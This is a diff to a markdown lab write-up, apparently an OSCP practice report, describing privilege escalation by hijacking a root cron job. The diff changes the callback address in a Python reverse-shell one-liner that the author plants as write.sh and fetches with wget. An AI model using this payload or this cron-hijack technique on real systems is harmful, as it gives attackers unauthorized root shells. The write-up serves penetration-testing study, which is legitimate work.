@@ -78,7 +78,7 @@ In this machine, I did all the same steps as the first machine but in the step
 ## Privilege Escalation
 
 In this machine also checked if there is any binary to use to escalate privilege but unfortunately I did not find any so I checked crontab I found there is a script called finally.sh run every 5 minutes with root permission so find this script location I cat it and got that script called other script called write.sh but write.sh owned by www-data and finnaly.sh with root user so i can use this to make crontab run something for me as root by changing the write.sh so what I did i removed the write.sh from server i and i create new now in my machine with.
-`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.55.200",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.239",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
 and run an HTTP server from my machine and download it to the server using `wget` after that i changed permission to make it executable because the finnaly.sh script call write.sh script with ./write needs permission to execute now all I need to wait for 5 minutes waiting for crontab to get the reverse shell with as root.
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.44.19.png)
